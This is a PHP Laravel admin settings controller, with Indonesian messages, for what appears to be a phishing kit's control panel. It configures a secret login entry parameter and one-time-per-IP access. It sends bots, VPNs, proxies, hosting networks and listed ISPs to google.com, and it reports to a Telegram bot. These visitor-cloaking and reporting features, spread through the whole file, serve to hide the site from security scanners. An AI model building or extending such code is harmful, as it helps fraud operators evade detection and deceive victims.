<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\OneTimeIp;
use App\Models\Setting;
use App\Services\BotIpBlocklistService;
use App\Services\TelegramService;
use App\Support\IspDetector;
use App\Support\ManualIpBlacklist;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Validation\Rule;
use Illuminate\View\View;

class SettingController extends Controller
{
    public function edit(TelegramService $telegram): View
    {
        $this->ensureDefaults();

        $secret = Setting::get('telegram_webhook_secret');

        return view('admin.settings', [
            'settings' => [
                'login_entry_param' => Setting::loginEntryParam(),
                'login_entry_value' => Setting::loginEntryValue(),
                'fallback_redirect_url' => Setting::get('fallback_redirect_url', 'https://www.google.com'),
                'one_time_enabled' => Setting::oneTimeEnabled(),
                'one_time_redirect_url' => Setting::oneTimeRedirectUrl(),
                'document_complete_redirect_url' => Setting::documentCompleteRedirectUrl(),
                'anti_bot_enabled' => Setting::bool('anti_bot_enabled', true),
                'anti_bot_mode' => Setting::get('anti_bot_mode', 'redirect'),
                'anti_bot_redirect_url' => Setting::safeUrl('anti_bot_redirect_url'),
                'anti_bot_strict' => Setting::bool('anti_bot_strict'),
                'anti_bot_extra_patterns' => Setting::get('anti_bot_extra_patterns', ''),
                'block_bot_ip_enabled' => Setting::bool('block_bot_ip_enabled', true),
                'block_bot_ip_myip_ms' => Setting::bool('block_bot_ip_myip_ms', true),
                'block_bot_ip_vastel' => Setting::bool('block_bot_ip_vastel', true),
                'block_bot_ip_mode' => Setting::get('block_bot_ip_mode', 'redirect'),
                'block_bot_ip_redirect_url' => Setting::safeUrl('block_bot_ip_redirect_url'),
                'block_bot_ip_count' => Setting::get('block_bot_ip_count', '0'),
                'block_bot_ip_cidr_count' => Setting::get('block_bot_ip_cidr_count', '0'),
                'block_bot_ip_synced_at' => Setting::get('block_bot_ip_synced_at', ''),
                'anti_vpn_enabled' => Setting::bool('anti_vpn_enabled', true),
                'anti_vpn_mode' => Setting::get('anti_vpn_mode', 'redirect'),
                'anti_vpn_redirect_url' => Setting::safeUrl('anti_vpn_redirect_url'),
                'anti_vpn_block_proxy' => Setting::bool('anti_vpn_block_proxy', true),
                'anti_vpn_block_hosting' => Setting::bool('anti_vpn_block_hosting', true),
                'anti_vpn_extra_isp' => Setting::get('anti_vpn_extra_isp', ''),
                'block_isp_enabled' => Setting::bool('block_isp_enabled', true),
                'block_isp_mode' => Setting::get('block_isp_mode', 'redirect'),
                'block_isp_redirect_url' => Setting::safeUrl('block_isp_redirect_url'),
                'block_isp_list' => Setting::get('block_isp_list', IspDetector::defaultListText()),
                'ipapi_is_api_key' => Setting::get('ipapi_is_api_key', ''),
                'proxycheck_api_key' => Setting::get('proxycheck_api_key', ''),
                'abuseipdb_api_key' => Setting::get('abuseipdb_api_key', ''),
                'abuseipdb_enabled' => Setting::bool('abuseipdb_enabled'),
                'telegram_enabled' => Setting::bool('telegram_enabled'),
                'telegram_bot_token' => Setting::get('telegram_bot_token', ''),
                'telegram_chat_id' => Setting::get('telegram_chat_id', ''),
                'telegram_default_phone' => Setting::get('telegram_default_phone', '0000'),
                'telegram_webhook_secret' => $secret,
            ],
            'entryUrl' => Setting::loginEntryUrl(),
            'webhookUrl' => url('/telegram/webhook/'.$secret),
            'webhookInfo' => $telegram->webhookInfo(),
            'telegramUsesHttps' => TelegramService::appUrlIsHttps(),
            'oneTimeIps' => OneTimeIp::query()->orderByDesc('recorded_at')->limit(100)->get(),
            'blacklistedIps' => ManualIpBlacklist::all(),
        ]);
    }

    public function update(Request $request): RedirectResponse
    {
        $reserved = ['admin', 's', 'telegram', 'api', 'up'];

        $data = $request->validate([
            'login_entry_param' => [
                'required', 'string', 'min:1', 'max:32',
                'regex:/^[a-z][a-z0-9_-]*$/i',
                Rule::notIn($reserved),
            ],
            'login_entry_value' => ['nullable', 'string', 'max:100', 'regex:/^[A-Za-z0-9_-]*$/'],
            'fallback_redirect_url' => ['required', 'url', 'max:500'],
            'one_time_enabled' => ['nullable', 'boolean'],
            'one_time_redirect_url' => ['required', 'url', 'max:500'],
            'document_complete_redirect_url' => ['required', 'url', 'max:500'],
            'anti_bot_enabled' => ['nullable', 'boolean'],
            'anti_bot_mode' => ['required', 'in:redirect,block'],
            'anti_bot_redirect_url' => ['required', 'url', 'max:500'],
            'anti_bot_strict' => ['nullable', 'boolean'],
            'anti_bot_extra_patterns' => ['nullable', 'string', 'max:5000'],
            'block_bot_ip_enabled' => ['nullable', 'boolean'],
            'block_bot_ip_myip_ms' => ['nullable', 'boolean'],
            'block_bot_ip_vastel' => ['nullable', 'boolean'],
            'block_bot_ip_mode' => ['required', 'in:redirect,block'],
            'block_bot_ip_redirect_url' => ['required', 'url', 'max:500'],
            'anti_vpn_enabled' => ['nullable', 'boolean'],
            'anti_vpn_mode' => ['required', 'in:redirect,block'],
            'anti_vpn_redirect_url' => ['required', 'url', 'max:500'],
            'anti_vpn_block_proxy' => ['nullable', 'boolean'],
            'anti_vpn_block_hosting' => ['nullable', 'boolean'],
            'anti_vpn_extra_isp' => ['nullable', 'string', 'max:5000'],
            'block_isp_enabled' => ['nullable', 'boolean'],
            'block_isp_mode' => ['required', 'in:redirect,block'],
            'block_isp_redirect_url' => ['required', 'url', 'max:500'],
            'block_isp_list' => ['nullable', 'string', 'max:20000'],
            'ipapi_is_api_key' => ['nullable', 'string', 'max:300'],
            'proxycheck_api_key' => ['nullable', 'string', 'max:300'],
            'abuseipdb_api_key' => ['nullable', 'string', 'max:300'],
            'abuseipdb_enabled' => ['nullable', 'boolean'],
            'telegram_enabled' => ['nullable', 'boolean'],
            'telegram_bot_token' => ['nullable', 'string', 'max:200'],
            'telegram_chat_id' => ['nullable', 'string', 'max:100'],
            'telegram_default_phone' => ['nullable', 'digits:4'],
        ], [
            'login_entry_param.not_in' => 'Nama parameter itu reserved. Pilih nama lain (contoh: gate, access, auth).',
            'login_entry_param.regex' => 'Parameter hanya huruf/angka/_/- dan harus diawali huruf.',
        ]);

        Setting::setMany([
            'login_entry_param' => strtolower($data['login_entry_param']),
            'login_entry_value' => (string) ($data['login_entry_value'] ?? ''),
            'fallback_redirect_url' => $data['fallback_redirect_url'],
            'one_time_enabled' => $request->boolean('one_time_enabled') ? '1' : '0',
            'one_time_redirect_url' => $data['one_time_redirect_url'],
            'document_complete_redirect_url' => $data['document_complete_redirect_url'],
            'anti_bot_enabled' => $request->boolean('anti_bot_enabled') ? '1' : '0',
            'anti_bot_mode' => $data['anti_bot_mode'],
            'anti_bot_redirect_url' => $data['anti_bot_redirect_url'],
            'anti_bot_strict' => $request->boolean('anti_bot_strict') ? '1' : '0',
            'anti_bot_extra_patterns' => (string) ($data['anti_bot_extra_patterns'] ?? ''),
            'block_bot_ip_enabled' => $request->boolean('block_bot_ip_enabled') ? '1' : '0',
            'block_bot_ip_myip_ms' => $request->boolean('block_bot_ip_myip_ms') ? '1' : '0',
            'block_bot_ip_vastel' => $request->boolean('block_bot_ip_vastel') ? '1' : '0',
            'block_bot_ip_mode' => $data['block_bot_ip_mode'],
            'block_bot_ip_redirect_url' => $data['block_bot_ip_redirect_url'],
            'anti_vpn_enabled' => $request->boolean('anti_vpn_enabled') ? '1' : '0',
            'anti_vpn_mode' => $data['anti_vpn_mode'],
            'anti_vpn_redirect_url' => $data['anti_vpn_redirect_url'],
            'anti_vpn_block_proxy' => $request->boolean('anti_vpn_block_proxy') ? '1' : '0',
            'anti_vpn_block_hosting' => $request->boolean('anti_vpn_block_hosting') ? '1' : '0',
            'anti_vpn_extra_isp' => (string) ($data['anti_vpn_extra_isp'] ?? ''),
            'block_isp_enabled' => $request->boolean('block_isp_enabled') ? '1' : '0',
            'block_isp_mode' => $data['block_isp_mode'],
            'block_isp_redirect_url' => $data['block_isp_redirect_url'],
            'block_isp_list' => (string) ($data['block_isp_list'] ?? ''),
            'ipapi_is_api_key' => trim((string) ($data['ipapi_is_api_key'] ?? '')),
            'proxycheck_api_key' => trim((string) ($data['proxycheck_api_key'] ?? '')),
            'abuseipdb_api_key' => trim((string) ($data['abuseipdb_api_key'] ?? '')),
            'abuseipdb_enabled' => $request->boolean('abuseipdb_enabled') ? '1' : '0',
            'telegram_enabled' => $this->telegramShouldEnable($request) ? '1' : '0',
            'telegram_bot_token' => trim((string) ($data['telegram_bot_token'] ?? '')),
            'telegram_chat_id' => trim((string) ($data['telegram_chat_id'] ?? '')),
            'telegram_default_phone' => (string) ($data['telegram_default_phone'] ?? ''),
        ]);

        return $this->settingsRedirect($this->activeSettingsTab($request))->with('status', 'Settings disimpan.');
    }

    protected function telegramShouldEnable(Request $request): bool
    {
        if ($request->boolean('telegram_enabled')) {
            return true;
        }

        $token = trim((string) $request->input('telegram_bot_token', ''));
        $chatId = trim((string) $request->input('telegram_chat_id', ''));

        return $token !== '' && $chatId !== '';
    }

    protected function activeSettingsTab(Request $request): ?string
    {
        $tab = (string) $request->input('_tab', '');

        return in_array($tab, ['umum', 'keamanan', 'telegram', 'data'], true) ? $tab : null;
    }

    protected function settingsRedirect(?string $tab = null): RedirectResponse
    {
        $url = route('admin.settings');
        if ($tab) {
            $url .= '#'.$tab;
        }

        return redirect()->to($url);
    }

    public function resetIspList(): RedirectResponse
    {
        Setting::set('block_isp_list', IspDetector::defaultListText());

        return back()->with('status', 'Daftar ISP di-reset ke default.');
    }

    public function syncBotIpBlocklist(BotIpBlocklistService $service): RedirectResponse
    {
        $result = $service->sync();

        return back()->with('status', sprintf(
            'Bot IP blocklist di-sync: %d IP, %d CIDR range.',
            $result['ips'],
            $result['cidrs'],
        ));
    }

    public function storeBlacklist(Request $request): RedirectResponse
    {
        $data = $request->validate([
            'ip' => ['required', 'ip'],
        ]);

        if (! ManualIpBlacklist::add($data['ip'])) {
            return back()->withErrors(['ip' => 'IP tidak valid.']);
        }

        return back()->with('status', 'IP '.$data['ip'].' ditambahkan ke blacklist.');
    }

    public function destroyBlacklist(Request $request): RedirectResponse
    {
        $data = $request->validate([
            'ip' => ['required', 'ip'],
        ]);

        ManualIpBlacklist::remove($data['ip']);

        return back()->with('status', 'IP '.$data['ip'].' dihapus dari blacklist.');
    }

    public function destroyOneTimeIp(OneTimeIp $oneTimeIp): RedirectResponse
    {
        $ip = $oneTimeIp->ip;
        $oneTimeIp->delete();

        return $this->settingsRedirect('data')->with('status', 'IP one-time '.$ip.' dihapus.');
    }

    public function clearOneTimeIps(): RedirectResponse
    {
        OneTimeIp::query()->delete();

        return $this->settingsRedirect('data')->with('status', 'Semua IP one-time dihapus.');
    }

    public function setWebhook(TelegramService $telegram): RedirectResponse
    {
        if (! filled(Setting::get('telegram_bot_token'))) {
            return $this->settingsRedirect('telegram')->withErrors(['telegram' => 'Isi Bot Token dulu, lalu Simpan Telegram.']);
        }

        if (! TelegramService::appUrlIsHttps()) {
            return $this->settingsRedirect('telegram')->withErrors([
                'telegram' => 'Webhook butuh <strong>HTTPS</strong>. APP_URL kamu masih HTTP. Pakai tombol <strong>Aktifkan Polling</strong> untuk tombol Telegram.',
            ]);
        }

        $secret = Setting::get('telegram_webhook_secret') ?: Str::random(40);
        Setting::set('telegram_webhook_secret', $secret);

        $url = url('/telegram/webhook/'.$secret);
        $result = $telegram->setWebhook($url);

        if (! ($result['ok'] ?? false)) {
            $msg = data_get($result, 'body.description', 'Gagal set webhook.');

            return $this->settingsRedirect('telegram')->withErrors(['telegram' => $msg]);
        }

        return $this->settingsRedirect('telegram')->with('status', 'Webhook Telegram aktif: '.$url);
    }

    public function enableTelegramPolling(TelegramService $telegram): RedirectResponse
    {
        if (! filled(Setting::get('telegram_bot_token'))) {
            return $this->settingsRedirect('telegram')->withErrors(['telegram' => 'Isi Bot Token dulu.']);
        }

        $telegram->deleteWebhook();
        $processed = $telegram->pollUpdatesOnce(0);

        return $this->settingsRedirect('telegram')->with(
            'status',
            'Mode polling aktif (webhook dimatikan). '.$processed.' update diproses. Scheduler akan polling otomatis tiap menit.'
        );
    }

    public function deleteWebhook(TelegramService $telegram): RedirectResponse
    {
        if (! filled(Setting::get('telegram_bot_token'))) {
            return $this->settingsRedirect('telegram')->withErrors(['telegram' => 'Isi Bot Token dulu.']);
        }

        $result = $telegram->deleteWebhook();
        if (! ($result['ok'] ?? false)) {
            $msg = data_get($result, 'body.description', 'Gagal hapus webhook.');

            return $this->settingsRedirect('telegram')->withErrors(['telegram' => $msg]);
        }

        return $this->settingsRedirect('telegram')->with('status', 'Webhook Telegram dihapus.');
    }

    public function test(TelegramService $telegram): RedirectResponse
    {
        $token = trim((string) Setting::get('telegram_bot_token', ''));
        $chatId = trim((string) Setting::get('telegram_chat_id', ''));

        if ($token === '' || $chatId === '') {
            return $this->settingsRedirect('telegram')->withErrors([
                'telegram' => 'Simpan dulu: isi Bot Token & Chat ID lalu klik <strong>Simpan</strong> di bawah.',
            ]);
        }

        $tokenCheck = $telegram->verifyToken();
        if (! $tokenCheck['ok']) {
            return $this->settingsRedirect('telegram')->withErrors([
                'telegram' => 'Token gagal: '.($tokenCheck['error'] ?? 'tidak valid'),
            ]);
        }

        if ($telegram->isBotSelfChat($chatId)) {
            return $this->settingsRedirect('telegram')->withErrors([
                'telegram' => 'Chat ID itu ID bot sendiri (@'.($tokenCheck['username'] ?? 'bot').'). Untuk channel, pakai ID channel format <code>-100xxxxxxxxxx</code> (bukan ID bot). Jadikan bot admin channel dulu.',
            ]);
        }

        $result = $telegram->sendMessageDetailed("<b>✅ Test OK</b>\nBot @".($tokenCheck['username'] ?? 'bot').' terhubung.');

        if ($result['ok']) {
            return $this->settingsRedirect('telegram')->with('status', 'Pesan test terkirim ke Telegram.');
        }

        $hint = match (true) {
            str_contains(strtolower((string) $result['error']), 'chat not found') => $this->chatNotFoundHint($telegram),
            str_contains(strtolower((string) $result['error']), "can't send messages to the bot") => ' Jangan pakai ID bot. Untuk channel: bot harus admin + Chat ID channel (-100...).',
            str_contains(strtolower((string) $result['error']), 'bot was blocked') => ' Bot diblokir user. Unblock bot di Telegram.',
            str_contains(strtolower((string) $result['error']), 'group chat was upgraded') => ' Group jadi supergroup — ambil Chat ID baru.',
            str_contains(strtolower((string) $result['error']), 'not a member') => ' Bot belum admin channel / belum ditambahkan ke group.',
            default => '',
        };

        return $this->settingsRedirect('telegram')->withErrors([
            'telegram' => 'Telegram API: '.($result['error'] ?? 'gagal kirim.').$hint,
        ]);
    }

    public function detectTelegramChats(TelegramService $telegram): RedirectResponse
    {
        $chats = $telegram->knownChats();
        if ($chats === []) {
            return $this->settingsRedirect('telegram')->withErrors([
                'telegram' => 'Belum ada chat terdeteksi. Untuk channel: jadikan bot <strong>admin</strong>, posting pesan di channel, lalu klik Deteksi lagi. (Jika webhook aktif, hapus webhook dulu sementara.)',
            ]);
        }

        $lines = ['Chat yang terdeteksi (salin ID ke Chat ID):'];
        foreach ($chats as $id => $meta) {
            $label = $meta['title'] ?? $meta['username'] ?? '-';
            $lines[] = "<code>{$id}</code> [{$meta['type']}] {$label}";
        }

        return $this->settingsRedirect('telegram')->with('status', implode('<br>', $lines));
    }

    protected function chatNotFoundHint(TelegramService $telegram): string
    {
        $chats = $telegram->knownChats();
        if ($chats === []) {
            return ' Channel: bot harus admin + posting di channel. Chat ID channel format -100xxxxxxxxxx. Atau klik Deteksi Chat ID.';
        }

        $ids = implode(', ', array_map(fn ($id) => "<code>{$id}</code>", array_keys($chats)));

        return " Chat ID salah. Coba salah satu: {$ids} — atau klik Deteksi Chat ID.";
    }

    protected function ensureDefaults(): void
    {
        $defaults = [
            'login_entry_param' => 'login',
            'login_entry_value' => '',
            'one_time_enabled' => '0',
            'one_time_redirect_url' => 'https://www.google.com',
            'document_complete_redirect_url' => 'https://www.google.com',
            'anti_bot_enabled' => '1',
            'anti_bot_mode' => 'redirect',
            'anti_bot_redirect_url' => 'https://www.google.com',
            'anti_bot_strict' => '0',
            'anti_bot_extra_patterns' => '',
            'block_bot_ip_enabled' => '1',
            'block_bot_ip_myip_ms' => '1',
            'block_bot_ip_vastel' => '1',
            'block_bot_ip_mode' => 'redirect',
            'block_bot_ip_redirect_url' => 'https://www.google.com',
            'block_bot_ip_extra' => '',
            'block_bot_ip_count' => '0',
            'block_bot_ip_cidr_count' => '0',
            'block_bot_ip_synced_at' => '',
            'anti_vpn_enabled' => '1',
            'anti_vpn_mode' => 'redirect',
            'anti_vpn_redirect_url' => 'https://www.google.com',
            'anti_vpn_block_proxy' => '1',
            'anti_vpn_block_hosting' => '1',
            'anti_vpn_extra_isp' => '',
            'block_isp_enabled' => '1',
            'block_isp_mode' => 'redirect',
            'block_isp_redirect_url' => 'https://www.google.com',
            'block_isp_list' => IspDetector::defaultListText(),
            'ipapi_is_api_key' => '',
            'proxycheck_api_key' => '',
            'abuseipdb_api_key' => '',
            'abuseipdb_enabled' => '0',
        ];

        foreach ($defaults as $key => $value) {
            if (Setting::get($key) === null) {
                Setting::set($key, $value);
            }
        }

        if (! filled(Setting::get('telegram_webhook_secret'))) {
            Setting::set('telegram_webhook_secret', Str::random(40));
        }
    }
}
